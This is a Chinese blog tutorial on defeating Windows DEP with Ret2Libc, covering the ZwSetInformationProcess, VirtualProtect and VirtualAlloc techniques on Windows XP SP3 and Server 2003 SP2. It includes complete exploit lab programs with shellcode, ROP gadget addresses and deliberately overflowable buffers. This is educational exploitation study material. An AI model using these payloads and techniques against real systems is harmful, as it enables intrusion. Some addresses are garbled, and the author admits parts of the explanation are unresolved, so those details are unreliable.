---
title: 攻击DEP的方法（上）——Ret2Libc
date: 2017-07-09 18:27:43
categories: 安全技术
tags: [DEP, windows]
---


## 利用Ret2Libc挑战DEP

让代码跳转到已经存在的系统函数中就不会被DEP拦截，Ret2libc攻击就是这个原理。（Return to libc）。简言之，就是shellcode的每条指令都可以在代码区中找到一条替代指令。但是这种方法太繁重，而且不好控制栈帧。
![ret2libc具体流程](/images/2017-07-09/ret2libc.jpg)

所以有以下三种方法：
1. 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行
2. 通过跳转到VirtualProtect函数将shellcode所在内存页设置爱为可执行状态，然后在转入shellcode执行
3. 通过跳转到VirtualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到段内存中执行

### 1. Ret2Libc之利用ZwSetInformationProcess

#### 1.1 ZwSetInformationProcess简介

API函数ZwQueryInformationProcess和ZwSetInformationProcess进行查询和修改(有些资料中是NtQueryInformationProcess和NtSetInformationProcess)。

进程的DEP设置标识保存在KPROCESS结构中的_KEXECUTE_OPTIONS上。

<pre><code>_KEXECUTE_OPTIONS
Pos0 ExecuteDisable: 1bit
Pos1 ExecuteEnable: 1bit
Pos2 DisableThunkEmulation: 1bit
Pos3 Permanent: 1bit
Pos4 ExecuteDispatchEnable: 1bit
Pos5 ImageDispatchEnable: 1bit
Pos6 Spare: 2bit
</code></pre>

前4个bit与DEP有关，当前进程DEP开启时ExecuteDisable位为1，当前进程DEP关闭时ExecuteEnable位为1，DisableThunkEmulation是为了兼容ATL程序设置的，Permanent被置为1后表示这些标志位都不能被修改。

<pre><code>NtSetInformationProcess(
	IN HANDLE ProcessHandle,
    IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
);
</code></pre>

第一个参数为进程句柄，设置为-1表示当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS；第四个参数为第三个参数的长度。于是，最终的参数设置为：

<pre><code>
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
ZwSetInformationProcess(
	NtCurrentProcess(),		// (HANDLE)-1
    ProcessExecuteFlags,	// 0x22
    &ExecuteFlags,			// ptr to 0x2
    sizeof(ExecuteFlags)	// 0x4
);
</code></pre>

但是问题是函数参数中会包含0x00这样的截断字符。其实解决办法是微软的兼容性考虑：如果一个进程的Permanent位没设置，当它加载DLL时，系统会对这个DLL进行DEP兼容性检查，当存在兼容性问题时进程的DEP就会关闭。为此微软设立了LdrpCheckNXCompatibility函数，当符合下列条件之一进程的DEP就会被关闭：
1. 当DLL受SafeDisc版权保护系统保护时
2. 当DLL包含有.aspcak、.pcle、.sforce等字节时
3. Windows Vista下面当DLL包含在注册表"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions"键下边标识出不需启动DEP的模块时

以SafeDisc为例，查看Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程：
![具体流程](/images/2017-07-09/safedisc.jpg)

我们可以模拟这个过程，从0x7C93CD24入手关闭DEP，这个地址可通过OllyFindAddr插件中的Disable DEP->Disable DEP&lt;=XP SP3来搜索
![DEP起始地址](/images/2017-07-09/find_addr.jpg)
由于只有CMP AL,1 成立的情况下程序继续执行，所以需要一个指令将AL修改为1。将AL修改为1后让程序转到0x7C93CD24执行，在执行0x7C93CD6F处的RETN 4时DEP已经关闭，此时如果我们可以在RETN到一个精心构造的指令地址上，就可能转入shellcode中执行。
![跳转地址](/images/2017-07-09/retn_4.jpg)

#### 1.2 实验代码

<pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x52\xE2\x92\x7C"		// MOV EAX, 1   RETN地址
	"\x85\x8B\x1D\x5D"		// 修正EBP
	"\x19\x4A\x97\x7C"		// 增大ESP
	"\xB4\xC1\xC5\x7D"		// jmp esp
	"\x24\xCD\x93\x7C"		// 关闭DEP代码的起始位置
	"\xE9\x33\xFF\xFF\xFF\x90\x90\x90";	// 回跳指令

void test()
{
	char str[176];
	//__asm int 3
	strcpy(str, shellcode);
}

int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
	return 0;
}
</code></pre>

#### 1.3  Windows XP SP3实验内容

<b>实验思路：</b>
1. 为了更直观，将不启用GS和SafeSEH
2. 函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖函数返回地址
3. 将函数的返回地址覆盖为类似MOV AL,1 retn的指令，在将AL置1后转入0x7C93CD24关闭DEP
4. DEP关闭后shellcode就可以正常执行

<b>实验环境</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3| |
|DEP状态|Optout||
|编译器|VC 6.0||
|编译选项|禁用优化选项||
|build版本|debug版本||

<font color=#f00>由于不知道如何设置VC6.0的release版本的禁用编译优化选项，所以直接使用了Debug版本！其实查看是否被优化，可以设置int 3断点，查看后续指令是否按照正常顺序执行！</font>

从上面的OllyFindAddr插件中的Disable DEP->Disable DEP&lt;=XP SP3搜索结果可以看出，step2提供了符合“将AL置1并收回程序控制权”要求的指令。本次使用0x7C92E252。
经过测试得到溢出字符串的起始地址:0x0012FDB0
test函数的返回地址:0x0012FE64
覆盖返回地址:0x7C92E252

调试发现，收回程序控制权之后，EIP修改为红框表示的值。所以为了让程序转入关闭DEP，需要返回地址后添加4字节0x7C93CD24。
![接受程序控制权](/images/2017-07-09/ret_addr.jpg)

重新编译调试，根据Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程可以知道，在0x7c93CD29处的跳转是将ESI的值赋给[EBP-4]，但是EBP在溢出的时候被破坏了，目前EBP-4的位置并不可写入，所以程序异常。
![给ebp-4地址赋值](/images/2017-07-09/edit_ebp.jpg)

所以在转入0x7C93CD24前，需将EBP指向一个可写的位置，为此可以通过PUSH ESP POP EBP RETN的指令将EBP定位到一个可写的位置，此指令在Disable DEP->Disable DEP&lt;=XP SP3的step3部分可以查看。但是若用此指令序列，若直接将ESP的值赋给EBP返回后，ESP相对于EBP位于高址位置，当有入栈操作时EBP-4可能被冲刷掉，所以用PUSH ESP POP EBP RETN 4来修正。此处使用的0x5D1D8B85处的地址。

当进入0x7C93CD33处的函数后，可以看到EBP-4中的内容已经被冲刷掉，内容修改为0x22，而_KEXECUTE_OPTIONS结构中只有前4位有关，0x22(00100010)代表关闭DEP。
![ZwSetInformationProcess设置](/images/2017-07-09/ZwSetInformationProcess.jpg)

虽然关闭了DEP，但是失去了进程的控制权。
![失去控制权](/images/2017-07-09/ret_addr2.jpg)

当ESP小于EBP时，可以用减小ESP或者增大EBP的方法。由于shellcode位于内存低址，所以减小ESP可能会破坏shellcode，所以可以增大EBP，但是本实验找不到！变通的方法是增大ESP到安全位置，让EBP和ESP之间的空间足够大，这样压栈就不会冲刷EBP内容。
可以用OllyFindAddr插件中的Overflow return address->POP RETN+N选项查找指令。我们选择0x7C974A19处的RETN 0x28来增大ESP。

这其中的关系有点绕，所以我也不打算继续讲了，需要我们进行实际调试！

<b>最终的shellcode组成</b>
1. 【操作7】168字节的弹出对话框机器码
2. 12字节的0x90填充
3. 【操作1】将AL置1，并重新掌握控制权 "\x52\xE2\x92\x7C"
4. 【操作2】修正EBP "\x85\x8B\x1D\x5D"
5. 【操作3】增大ESP "\x19\x4A\x97\x7C"
6. 【操作5】 JMP ESP至最后一段 "\xB4\xC1\xC5\x7D"
7. 【操作4】关闭DEP "\x24\xCD\x93\x7C"
8. 【操作6】回跳至shellcode "\xE9\x33\xFF\xFF\xFF\x90\x90\x90"

#### 1.4 Windows Server 2003 SP2实验内容

<font color=#f00>我的实验是用的Windows Server 2003 Enterprise SP2</font>

由于windows 2003 SP2对LdrpCheckNXCompatibility函数进行了少许修改，导致该函数在执行的过程中会对ESI指向的内存附近进行操作。所以可以利用push esp pop esi retn来调整ESI，这些指令在Disable DEP->Disable DEP>=2003 SP2搜索结果的step4部分。

变通的方法：
1. 找到pop eax retn指令，并让程序转入该位置执行
2. 找到一条pop esi retn指令，并保证在执行1中的pop eax时对它的地址位于栈顶，这就可以将地址放到eax中
3. 找到push esp jmp eax指令，并转入执行

最终windows server 2003 sp2测试时对应的代码为：
<pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xE9\x77\xBE\x77"		// 修正EBP
	"\x81\x71\xBA\x7C"		// pop eax retn
	"\x0A\x1A\xBF\x7C"		// pop pop pop retn
	"\xA5\x6F\xBE\x7C"		// pop esi retn
	"\xBF\x7D\xC9\x77"		// push esp jmp eax
	"\x5F\xFB\x87\x7C"		// retn 0x30
	"\x17\xF5\x96\x7C"		// 关闭DEP代码的起始位置
	"\x23\x1E\x1A\x7D"		// jmp esp
	"\xE9\x27\xFF\xFF\xFF\x90\x90\x90";  // jmp shellcode

void test()
{
	char str[176];
	//__asm int 3
	strcpy(str, shellcode);
}

int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
	return 0;
}
</code></pre>

溢出字符串开始地址：0x0012FDB0
返回地址所在位置：0x0012FE64
修正EBP地址：0x77BE77E9 (push esp pop ebp retn 4)
pop eax retn所在地址: 0x7CbA7181
由于retn 4，所以下面一条指令在0x7CBA7181后面4字节处，但是由于先pop eax，所以应该返回值0x7CBA7181后8字节处进行push esp jmp eax的操作: 0x77C97DBF
然后通过jmp eax跳回去执行pop esi retn指令（0x7CBA7181后面4字节处）：0x7CBE6FA5

然后就是执行增大ESP，创造足够大的空间：0x7C87FB5F
然后关闭DEP：0x7C96F517(这里直接进入了ZwSetInformationProcess所在路径)

不知道怎么回事，反正就是到了0x7CBA7181后，这时候使用pop pop pop retn：0x7CBF1A0A
于是到了0x&C96F517之后，这时候用jmp esp指令：0x7D1A1E23
然后是回跳至shellcode位置，代码\xE9\x27\xFF\xFF\xFF
最后用\x90\x90\x90填充


### 2. Ret2Libc之利用VirtualProctect

#### 2.1 VirtualProtect简介
位于Kernel32.dll上的VirtualProtect是为了解决：Optout和AlwaysON模式下所有进程是默认开启DEP，而如果程序自身偶尔需要从堆栈中取指令，就会出错的问题。

其可修改指定内存的属性，包括是否可执行。

<pre><code>
BOOL VirtualProtect{
  LPVOID lpAddress,
  DWORD dwSize,
  DWORD flNewProtect,
  PDWORD lpflOldProtect
};
</code></pre>
lpAddress：要改变属性的内存起始地址
dwSize：要改变属性的内存区域大小
flNewProtect：内存新的属性类型，设为PAGE_EXECUTE_READWRITE(0x40)是该内存也可读可写可执行
lpflOldProtect：内存原始属性类型保存地址

如果能够向下面方式布置，就可让shellcode可执行
<pre><code>
BOOL VirtualProtect{
  shellcode所在内存空间起始地址,
  shellcode大小,
  0x40,
  某个可写地址
};
</code></pre>

注意：
1. 由于实验时参数包含0x00，为了方便，将strcpy改为memcoy
2. 对shellcode内存空间起始地址的确定，不同机器会有变化，本实验用巧妙的栈帧构造动态确定shellcode所在内存空间起始地址

#### 2.2 实验代码

<pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\x8A\x17\x84\x7c"			// pop eax retn
	"\x0A\x1A\xBF\x7C"			// pop pop pop retn
	"\xBA\xD9\xBB\x7C"			// 修正EBP
	"\x8B\x17\x84\x7C"			//RETN
	"\x90\x90\x90\x90"			
	"\xBF\x7D\xC9\x77"			// push esp jmp eax(后来成为shellcode起始地址)
	"\xFF\x00\x00\x00"			// 要修改的内存大小
	"\x40\x00\x00\x00"			// 可读可写可执行属性代码
	"\xBF\x7D\xC9\x77"			// push esp jmp eax(后来成为某个可写地址)
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\xE8\x1F\x80\x7C"			// 修改内存属性
	"\x90\x90\x90\x90"
	"\xA4\xDE\xA2\x7C"			// jmp esp
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void test()
{
	char str[176];
	//__asm int 3
	memcpy(str, shellcode, 420);
}

int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
	return 0;
}

</code></pre>

#### 2.3 实验内容

<b>实验解释</b>
1. 本实验不启用GS和DEP
2. test有典型的溢出
3. 覆盖返回地址后，通过Ret2Libc技术，利用VirtualProtect函数将shellcode所在的内存区域设置为可执行模式
4. 通过push esp jmp eax指令序列动态设置VirtualProtect函数中的shellcode所在内存起始地址以及内存原始属性类型保存地址
5. 内存取悦被设置为可执行模式后shellcode就可正常执行了

<b>实验环境</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows 2003 SP2| |
|DEP状态|Optout||
|编译器|VC 6.0||
|编译选项|禁用优化选项||
|build版本|debug版本||

<b>VirtualProtect函数的具体实现</b>
![virtualprotect具体实现](/images/2017-07-09/virtualprotect.jpg)
如图，我们可以选择0x7C801FE8作为切入点，按照函数要求布置好栈帧。

由于溢出过程导致EBP被破坏，所以可用PUSH ESP POP EBP ERTN 4来修复。

溢出字符串的起始地址：0x0012FDB0
返回地址所在位置: 0x0012FE64
修正EBP地址(push esp pop ebp retn 4)：0x7CBBD9BA
由于执行完这些指令后，esp就转到了ebp+8。此时状态如下:
![修正EBP后的](/images/2017-07-09/ret2libc_vp.jpg)

于是可以尝试让ESP向下移动4字节，RETN指令即可，此处用的是0x7C84178B处，最后ESP=0x0012FE74。然后用PUSH ESP RETN/JMP \*\*指令，就可以让esp继续向下移动4字节，并且保证进入shellcode中，0x77C97DBF处的"push esp jmp eax"符合要求。但是shellcode现在还没有执行能力，所以需要修改一下shellcode，在修正EBP之前先pop eax retn。此时的eax对应的是pop pop pop retn。后续都是调试出来的，现如今还无法讲清楚！！！！

然后继续调试，最终得到上面代码中的shellcode。

### 3. Ret2Libc之利用VirtualAlloc

#### 3.1 VirtualAlloc简介

位于kernel32.dll中的VirtualAlloc函数可以申请一段具有可执行属性的内存。于是可以用Ret2Libc的第一跳设置为VirtualAlloc函数地址，然后将shellcode复制到申请的内存空间执行

VirutlAlloc函数说明
<pre><code>LPVOID WINAPI VirtualAlloc{
	__in_opt LPVOID lpAddress,
    __in 	 SIZE_T dwSize,
    __in 	 DWORD flAllocationType,
    __in	 DWORD flProtect
};
</code></pre>

lpAddress: 申请内存区域的地址，如果参数是NULL，系统将会决定分配内存取悦位置，并且按照64KB向上取整
dwSize：申请内存的类型
flAlloctionType: 申请内存的类型
flProtect：申请内存的访问控制类型，如读写执行等

#### 3.2 实验代码

<pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\xBA\xD9\xBB\x7C"			// 修正EBP
	"\xBC\x45\x82\x7C"			// 申请空间
	"\x90\x90\x90\x90"
	"\xFF\xFF\xFF\xFF"			// -1 当前进程
	"\x00\x00\x03\x00"			// 申请空间起始地址
	"\xFF\x00\x00\x00"			// 申请空间大小
	"\x00\x10\x00\x00"			// 申请类型
	"\x40\x00\x00\x00"			// 申请空间访问类型
	"\x90\x90\x90\x90"
	"\x8A\x17\x84\x7C"			// pop eax retn
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x0B\x1A\xBF\x7C"			// pop pop retn
	"\xBA\xD9\xBB\x7C"			// 修正EBP retn 4
	"\x5F\x78\xA6\x7C"			// pop retn
	"\x00\x00\x03\x00"			// 可执行内存空间地址，转入执行用
	"\x00\x00\x03\x00"			// 可执行内存空间地址，复制用
	"\xBF\x7D\xC9\x77"			// push esp jmp eax && 原始shellcode起始地址
	"\xFF\x00\x00\x00"			// shellcode 长度
	"\xAC\xAF\x94\x7C"			// memcpy
	"\x00\x00\x03\x00"			// 一个可以读地址
	"\x00\x00\x03\x00"			// 一个可以读地址
	"\x00\x90\x90\x94"	
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void test()
{
	char str[176];
	//__asm int 3
	memcpy(str, shellcode, 500);
}

int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
	return 0;
}
</code></pre>

#### 3.3 实验内容

<b>实验思路</b>
1. 不启用GS和SafeSEH
2. test存在典型的溢出
3. 通过覆盖范返回地址，运用Ret2Libc技术，利用VirtualAlloc函数申请一段具有可执行权限的内存
4. 通过memcpy函数将shellcode复制到VirtualAlloc函数申请的可执行内存空间中
5. 最后在这段可执行的内存空间中执行shellcode，实现DEP绕过

<b>实验环境</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows 2003 SP2| |
|DEP状态|Optout||
|编译器|VC 6.0||
|编译选项|禁用优化选项||
|build版本|debug版本||

<b>VirtualAlloc函数的具体实现</b>
![virtualalloc实现流程](/images/2017-07-09/virtualalloc.jpg)

类似VirtualProtect，我们选择0x7C8245BC（CALL VirtualAllocEx）处作为切入点。
<pre><code>lpAddress=0x00030000
dwSize=0xFF
flAllocationType=0x00001000
flProtect=0x00000040
</code></pre>

当执行到call VirtualAllocEx地址后，发现如图所示的内容：
![申请空间之后](/images/2017-7-09/virtualalloc2.jpg)
从图中可以看出eax=0x00030000，这说明我们申请到了空间。

而memcpy函数位于ntdll.dll，需要三个参数，分别为目的内存起始地址、源内存起始地址、复制长度。其中目的内存地址和复制长度可以直接写在shellcode中，但是源内存起始地址不好确定，所以使用push esp jmp eax指令来填充这个参数。

![memcpy运行结构](/images/2017-07-09/memcpy.jpg)

根据图片可以看出， memcpy中的源地址放在了EBP+0xC，目的地址为EBP+0x10，长度为EBP+0x8。所以后面的工作就是将这三个位置进行赋值，采用Ret2Libc的方式，对这些位置进行赋值。